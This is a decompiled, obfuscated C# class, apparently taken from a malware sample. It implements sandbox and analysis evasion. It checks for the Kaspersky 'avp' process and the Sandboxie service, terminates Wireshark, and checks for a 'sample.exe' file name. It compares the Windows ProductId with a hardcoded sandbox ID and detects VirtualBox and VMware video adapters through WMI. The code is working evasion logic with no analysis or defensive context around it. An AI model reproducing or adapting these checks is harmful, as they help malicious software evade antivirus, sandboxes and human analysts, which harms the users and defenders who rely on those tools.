using System;
using System.Collections;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Security;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using SmartAssembly.Attributes;
using SmartAssembly.Shared;
using SmartAssembly.SmartExceptionsCore;
using SmartAssembly.SmartUsageCore;
using SmartAssembly.Zip;

namespace ns0;

[StandardModule]
internal sealed class Class2
{
	private static object object_0;

	private static string string_0;

	private static string string_1;

	private static RegistryKey registryKey_0;

	private static object object_1;

	private static string string_2;

	[SecuritySafeCritical]
	static Class2()
	{
		Class32.smethod_1();
		try
		{
			string_1 = "SELECT * FROM Win32_VideoController";
			registryKey_0 = SimpleZip.Class6.smethod_2(Registry.LocalMachine, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", bool_0: false, 257, 317);
			object_1 = SmartAssembly.SmartUsageCore.ReportUsageAttribute.smethod_0(Class20.smethod_1(registryKey_0, "ProductId", 164, 144), 373, 351);
			string_2 = "76487-337-8429955-22614";
		}
		catch (Exception exception)
		{
			StackFrameHelper.CreateException0(exception);
			throw;
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static bool smethod_0()
	{
		int num2 = default(int);
		bool flag = default(bool);
		int num = default(int);
		try
		{
			int try0000_dispatch = -1;
			bool result;
			while (true)
			{
				try
				{
					/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
					switch (try0000_dispatch)
					{
					default:
						Class23.smethod_1(301, 287);
						num2 = 2;
						flag = Class37.smethod_2("avp", 998, 962).Length >= 1;
						goto end_IL_0000;
					case 52:
						num = -1;
						switch (num2)
						{
						case 2:
							Class15.smethod_1(720, 754);
							goto end_IL_0000;
						}
						break;
					}
					goto IL_008a;
					end_IL_0000:;
				}
				catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
				{
					ReportSender.smethod_2((Exception)obj, 54, 102);
					try0000_dispatch = 52;
					continue;
				}
				result = flag;
				if (num != 0)
				{
					ProjectData.ClearProjectError();
				}
				break;
				IL_008a:
				throw SmartAssembly.SmartExceptionsCore.ReportUsageAttribute.smethod_1(-2146828237, 944, 899);
			}
			return result;
		}
		catch (Exception exception)
		{
			StackFrameHelper.CreateException3(exception, flag, num2, num);
			throw;
		}
	}

	public static void smethod_1()
	{
		Process[] array = default(Process[]);
		Process[] array2 = default(Process[]);
		int i = default(int);
		Process process = default(Process);
		string o = default(string);
		try
		{
			array = SimpleZip.Class13.smethod_0(677, 755);
			array2 = array;
			for (i = 0; i < array2.Length; i = checked(i + 1))
			{
				process = array2[i];
				o = StackFrameHelper.smethod_1(process, 718, 760);
				if (AppNameFinder.smethod_1(o, "The Wireshark Network Analyzer", 461, 420))
				{
					Class14.smethod_1(process, 204, 211);
				}
			}
		}
		catch (Exception exception)
		{
			StackFrameHelper.CreateException5(exception, process, array, o, i, array2);
			throw;
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static bool smethod_2()
	{
		int num2 = default(int);
		bool flag = default(bool);
		int num = default(int);
		try
		{
			int try0000_dispatch = -1;
			bool result;
			while (true)
			{
				try
				{
					/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
					switch (try0000_dispatch)
					{
					default:
						Class23.smethod_1(940, 926);
						num2 = 2;
						flag = Class37.smethod_2("SbieSvc", 987, 1023).Length >= 1;
						goto end_IL_0000;
					case 52:
						num = -1;
						switch (num2)
						{
						case 2:
							Class15.smethod_1(924, 958);
							goto end_IL_0000;
						}
						break;
					}
					goto IL_0090;
					end_IL_0000:;
				}
				catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
				{
					ReportSender.smethod_2((Exception)obj, 591, 543);
					try0000_dispatch = 52;
					continue;
				}
				result = flag;
				if (num != 0)
				{
					ProjectData.ClearProjectError();
				}
				break;
				IL_0090:
				throw SmartAssembly.SmartExceptionsCore.ReportUsageAttribute.smethod_1(-2146828237, 750, 733);
			}
			return result;
		}
		catch (Exception exception)
		{
			StackFrameHelper.CreateException3(exception, flag, num2, num);
			throw;
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static bool smethod_3()
	{
		int num2 = default(int);
		string startupPath = default(string);
		string o = default(string);
		bool flag = default(bool);
		int num = default(int);
		try
		{
			int try0000_dispatch = -1;
			bool result;
			while (true)
			{
				try
				{
					/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
					switch (try0000_dispatch)
					{
					default:
						Class23.smethod_1(980, 998);
						num2 = 2;
						startupPath = Application.get_StartupPath();
						o = Class35.smethod_8(startupPath, "\\sample.exe", 566, 600);
						flag = ((DoNotEncodeStringsAttribute.smethod_0(AppNameFinder.smethod_0(845, 879), o, bool_0: false, 977, 910) == 0) ? true : false);
						goto end_IL_0000;
					case 90:
						num = -1;
						switch (num2)
						{
						case 2:
							Class15.smethod_1(14, 44);
							goto end_IL_0000;
						}
						break;
					}
					goto IL_00b3;
					end_IL_0000:;
				}
				catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
				{
					ReportSender.smethod_2((Exception)obj, 243, 163);
					try0000_dispatch = 90;
					continue;
				}
				result = flag;
				if (num != 0)
				{
					ProjectData.ClearProjectError();
				}
				break;
				IL_00b3:
				throw ProjectData.CreateProjectError(-2146828237);
			}
			return result;
		}
		catch (Exception exception)
		{
			StackFrameHelper.CreateException5(exception, flag, startupPath, o, num2, num);
			throw;
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static bool smethod_4()
	{
		int num2 = default(int);
		bool flag = default(bool);
		int num = default(int);
		try
		{
			int try0000_dispatch = -1;
			bool result;
			while (true)
			{
				try
				{
					/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
					switch (try0000_dispatch)
					{
					default:
						Class23.smethod_1(416, 402);
						num2 = 2;
						flag = (DoNotDistributeAttribute.smethod_1(object_1, string_2, bool_0: false, 685, 752) ? true : false);
						goto end_IL_0000;
					case 55:
						num = -1;
						switch (num2)
						{
						case 2:
							Class15.smethod_1(305, 275);
							goto end_IL_0000;
						}
						break;
					}
					goto IL_0093;
					end_IL_0000:;
				}
				catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
				{
					ReportSender.smethod_2((Exception)obj, 548, 628);
					try0000_dispatch = 55;
					continue;
				}
				result = flag;
				if (num != 0)
				{
					ProjectData.ClearProjectError();
				}
				break;
				IL_0093:
				throw SmartAssembly.SmartExceptionsCore.ReportUsageAttribute.smethod_1(-2146828237, 597, 614);
			}
			return result;
		}
		catch (Exception exception)
		{
			StackFrameHelper.CreateException3(exception, flag, num2, num);
			throw;
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static bool smethod_5()
	{
		int num2 = default(int);
		string o = default(string);
		bool flag = default(bool);
		int num = default(int);
		try
		{
			int try0000_dispatch = -1;
			bool result;
			while (true)
			{
				try
				{
					/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
					switch (try0000_dispatch)
					{
					default:
						Class23.smethod_1(739, 721);
						num2 = 2;
						smethod_8();
						o = string_0;
						flag = ((DoNotEncodeStringsAttribute.smethod_0(o, "VirtualBox Graphics Adapter", bool_0: false, 801, 894) == 0) ? true : false);
						goto end_IL_0000;
					case 63:
						num = -1;
						switch (num2)
						{
						case 2:
							Class15.smethod_1(598, 628);
							goto end_IL_0000;
						}
						break;
					}
					goto IL_009b;
					end_IL_0000:;
				}
				catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
				{
					ReportSender.smethod_2((Exception)obj, 837, 789);
					try0000_dispatch = 63;
					continue;
				}
				result = flag;
				if (num != 0)
				{
					ProjectData.ClearProjectError();
				}
				break;
				IL_009b:
				throw SmartAssembly.SmartExceptionsCore.ReportUsageAttribute.smethod_1(-2146828237, 331, 376);
			}
			return result;
		}
		catch (Exception exception)
		{
			StackFrameHelper.CreateException4(exception, flag, o, num2, num);
			throw;
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static bool smethod_6()
	{
		int num2 = default(int);
		string o = default(string);
		bool flag = default(bool);
		int num = default(int);
		try
		{
			int try0000_dispatch = -1;
			bool result;
			while (true)
			{
				try
				{
					/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
					switch (try0000_dispatch)
					{
					default:
						Class23.smethod_1(812, 798);
						num2 = 2;
						smethod_8();
						o = string_0;
						flag = ((DoNotEncodeStringsAttribute.smethod_0(o, "VMware SVGA II", bool_0: false, 174, 241) == 0) ? true : false);
						goto end_IL_0000;
					case 63:
						num = -1;
						switch (num2)
						{
						case 2:
							Class15.smethod_1(440, 410);
							goto end_IL_0000;
						}
						break;
					}
					goto IL_009b;
					end_IL_0000:;
				}
				catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
				{
					ReportSender.smethod_2((Exception)obj, 138, 218);
					try0000_dispatch = 63;
					continue;
				}
				result = flag;
				if (num != 0)
				{
					ProjectData.ClearProjectError();
				}
				break;
				IL_009b:
				throw SmartAssembly.SmartExceptionsCore.ReportUsageAttribute.smethod_1(-2146828237, 344, 363);
			}
			return result;
		}
		catch (Exception exception)
		{
			StackFrameHelper.CreateException4(exception, flag, o, num2, num);
			throw;
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static bool smethod_7()
	{
		int num2 = default(int);
		string o = default(string);
		bool flag = default(bool);
		int num = default(int);
		try
		{
			int try0000_dispatch = -1;
			bool result;
			while (true)
			{
				try
				{
					/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
					switch (try0000_dispatch)
					{
					default:
						Class23.smethod_1(608, 594);
						num2 = 2;
						smethod_8();
						o = string_0;
						flag = ((DoNotEncodeStringsAttribute.smethod_0(o, "VM Additions S3 Trio32/64", bool_0: false, 841, 790) == 0) ? true : false);
						goto end_IL_0000;
					case 63:
						num = -1;
						switch (num2)
						{
						case 2:
							Class15.smethod_1(194, 224);
							goto end_IL_0000;
						}
						break;
					}
					goto IL_0094;
					end_IL_0000:;
				}
				catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
				{
					ReportSender.smethod_2((Exception)obj, 1, 81);
					try0000_dispatch = 63;
					continue;
				}
				result = flag;
				if (num != 0)
				{
					ProjectData.ClearProjectError();
				}
				break;
				IL_0094:
				throw SmartAssembly.SmartExceptionsCore.ReportUsageAttribute.smethod_1(-2146828237, 907, 952);
			}
			return result;
		}
		catch (Exception exception)
		{
			StackFrameHelper.CreateException4(exception, flag, o, num2, num);
			throw;
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private static void smethod_8()
	{
		int num2 = default(int);
		object[] array = default(object[]);
		object[] array2 = default(object[]);
		bool[] array4 = default(bool[]);
		IEnumerator enumerator = default(IEnumerator);
		object o = default(object);
		int num = default(int);
		try
		{
			int try0000_dispatch = -1;
			while (true)
			{
				try
				{
					/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
					switch (try0000_dispatch)
					{
					default:
					{
						Class23.smethod_1(904, 954);
						num2 = 2;
						object obj = SmartAssembly.SmartExceptionsCore.DoNotObfuscateAttribute.smethod_1("winmgmts:", null, 616, 618);
						array = new object[1] { string_1 };
						array2 = array;
						object[] array3 = array2;
						array4 = new bool[1] { true };
						object obj2 = Form1.smethod_0(obj, null, "ExecQuery", array3, null, null, array4, 893, 846);
						if (array4[0])
						{
							string_1 = (string)SmartAssembly.SmartUsageCore.DoNotPruneAttribute.smethod_2(SmartAssembly.SmartUsageCore.ReportUsageAttribute.smethod_0(array2[0], 446, 404), Class26.smethod_1(typeof(string).TypeHandle, 145, 181), 193, 216);
						}
						object_0 = SmartAssembly.SmartUsageCore.ReportUsageAttribute.smethod_0(obj2, 301, 263);
						enumerator = ((IEnumerable)object_0).GetEnumerator();
						while (enumerator.MoveNext())
						{
							o = SmartAssembly.SmartUsageCore.ReportUsageAttribute.smethod_0(enumerator.Current, 618, 576);
							string_0 = SimpleZip.Class5.smethod_1(Form1.smethod_0(o, null, "Description", new object[0], null, null, null, 42, 25), 213, 154);
						}
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
						goto end_IL_0000;
					}
					case 302:
						num = -1;
						switch (num2)
						{
						case 2:
							Class15.smethod_1(440, 410);
							goto end_IL_0000;
						}
						break;
					}
					goto IL_0182;
					end_IL_0000:;
				}
				catch (object obj3) when (obj3 is Exception && num2 != 0 && num == 0)
				{
					ProjectData.SetProjectError((Exception)obj3);
					try0000_dispatch = 302;
					continue;
				}
				if (num != 0)
				{
					ProjectData.ClearProjectError();
				}
				break;
				IL_0182:
				throw ProjectData.CreateProjectError(-2146828237);
			}
		}
		catch (Exception exception)
		{
			StackFrameHelper.CreateException7(exception, o, array, array2, array4, enumerator, num2, num);
			throw;
		}
	}
}
